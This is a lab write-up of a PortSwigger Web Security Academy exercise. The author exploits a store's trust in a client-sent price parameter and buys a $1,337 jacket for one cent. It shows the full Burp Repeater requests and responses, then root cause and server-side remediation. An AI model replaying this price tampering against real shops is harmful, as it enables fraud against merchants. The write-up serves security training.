# PortSwigger Lab: Excessive trust in client-side controls

# TAGS: Business Logic, Client-Side Controls, Price Manipulation, Burp Suite, Repeater

Category: Business Logic
Date: October 14, 2026
Day: Wednesday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
Published: Ready
Status: Done

---

# Lab Information:

- **Vulnerability Location:** `POST /cart` — the `price` parameter.
- **Difficulty:** Apprentice
- **Objective:** Buy the "Lightweight l33t leather jacket" for an unintended price.
- **Tools:** Burp Suite, Burp Repeater
- **Provided Credentials:** `wiener:peter`

---

## Intro

This new series is about Business Logic.

Business logic vulnerabilities are flaws in the design and implementation of an application that let users do something the application was not supposed to allow. They are not technical bugs like injection — they come from flawed assumptions about how users will interact with the app. In this lab, the app assumes the client will never tamper with the price it sends.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says that the application does not validate user input and that there is a logic flaw in the purchase workflow.

The goal is to buy a specific item: the **Lightweight l33t leather jacket**.

In this series we have a store again, but this time we can add items to a cart and place orders. We also have limited credit to spend, which is **$100.00**.

I found the item I had to check out — it costs **$1,337.00**, which is more than my credit. I added the item to my cart and sent the resulting `POST /cart` request to Burp Repeater:

```http
POST /cart HTTP/2
Host: 0ae8008504228649823838ad00c8005c.web-security-academy.net
Cookie: session=I1YcRvZY04LN9Lon552bsiEpH4TtPpkE
Content-Length: 49
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0ae8008504228649823838ad00c8005c.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae8008504228649823838ad00c8005c.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

productId=1&redir=PRODUCT&quantity=1&price=133700
```

The `price` value `133700` is sent in cents — that is **$1,337.00**.

---

## Exploitation:

#### Step 1: Change the price parameter

My first guess was to change the `price` parameter, because — according to the lab description — the application does not validate the user input. The original price was `133700` cents ($1,337.00), so I changed it to `1` cent and sent the request:

```http
POST /cart HTTP/2
Host: 0ae8008504228649823838ad00c8005c.web-security-academy.net
Cookie: session=I1YcRvZY04LN9Lon552bsiEpH4TtPpkE
Content-Length: 44
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0ae8008504228649823838ad00c8005c.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae8008504228649823838ad00c8005c.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

productId=1&redir=PRODUCT&quantity=1&price=1
```

The response was:

```http
HTTP/2 302 Found
Location: /product?productId=1
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

I checked my cart and the item was there for `$0.01`:

```http
...
<td>
    <a href=/product?productId=1>Lightweight &quot;l33t&quot; Leather Jacket</a>
</td>
<td>$0.01</td>
...
```

The server accepted the price I sent instead of the real one.

#### Step 2: Checkout the order

With the jacket now costing one cent, I clicked checkout and placed the order:

```http
POST /cart/checkout HTTP/2
Host: 0ae8008504228649823838ad00c8005c.web-security-academy.net
Cookie: session=I1YcRvZY04LN9Lon552bsiEpH4TtPpkE
Content-Type: application/x-www-form-urlencoded

csrf=hMCT2so1sXuk6BjBzhPqAmccvepdku1b
```

```http
HTTP/2 303 See Other
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The order was confirmed and the lab was solved.

---

## Root Cause

The application trusts the `price` value sent by the client in the `POST /cart` request. When an item is added to the cart, the server stores the price supplied by the browser instead of looking it up server-side. Because nothing stops the client from editing that value, I could set the jacket's price to one cent and complete the purchase.

---

## Impact

An attacker can buy products for an arbitrary price — here, a $1,337.00 jacket for $0.01. In real-world applications this means revenue loss, free products, and the ability to manipulate any business value the application lets the client control (prices, discounts, quantities, shipping, etc.). It is a fundamental trust boundary violation: the client can never be trusted with values that drive money or decisions.

---

## Remediation

To prevent this issue, applications should:

- Never trust prices, totals, discounts, or other business values sent by the client — look them up server-side from the product catalog;
- Recompute the order total on the server at checkout, using server-side prices;
- Validate all input server-side, including values that are "only" used by the UI;
- Treat any client-controlled value as untrusted, even if it is sent in a hidden field.

---

## Key Takeaways

1. Client-side controls are not security controls — anything the browser sends can be modified.
2. The `price` parameter in `POST /cart` was the trust flaw here; the server accepted it as-is.
3. Prices were sent in cents (`133700` = $1,337.00), so `1` = $0.01.
4. Business logic flaws come from wrong assumptions, not from code injection — always recompute money server-side.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Excessive trust in client-side controls (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)
- [PortSwigger — Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
